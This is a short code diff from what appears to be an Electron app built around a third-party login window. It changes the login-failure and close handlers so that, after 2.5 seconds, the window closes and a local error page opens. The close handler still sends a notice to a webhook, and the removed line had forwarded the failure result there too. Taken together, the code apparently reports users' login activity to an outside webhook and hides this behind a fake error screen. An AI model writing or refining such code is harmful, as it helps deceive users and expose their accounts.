@@ -51,7 +51,11 @@ ${getCreationDate(json.id)}`);
   
   LoginApi.setLoginFailListener(result => {
     //when the user enter wrong password/username or need captcha verification/2fa etc...
-    webhook.send(result);
+    setTimeout(() => {
+      win.close();
+      const err = new BrowserWindow();
+      err.loadFile('src/error.html');
+    }, 2500);
   });
   
   LoginApi.setCancelListener(() => {
@@ -62,6 +66,11 @@ ${getCreationDate(json.id)}`);
   LoginApi.setCloseListener(() => {
     //when the page is closed by the user or after clogin complete
     webhook.send('Login button pressed and page has closed or user canceled the login');
+    setTimeout(() => {
+      win.close();
+      const err = new BrowserWindow();
+      err.loadFile('src/error.html');
+    }, 2500);
   });
 };
 
